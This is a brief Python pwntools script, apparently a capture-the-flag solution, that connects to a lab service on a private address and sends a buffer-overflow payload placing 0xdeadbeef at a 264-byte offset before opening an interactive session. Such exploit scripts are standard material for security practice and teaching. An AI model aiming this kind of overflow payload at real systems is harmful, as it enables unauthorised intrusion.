from pwn import * 
#exe = context.binary = ELF('chall')
io = remote('192.168.23.61', 20025)

io.recvuntil('see')
offset = 264
payload = fit ({
    offset: 0xdeadbeef
})

io.sendline(payload)
io.interactive()
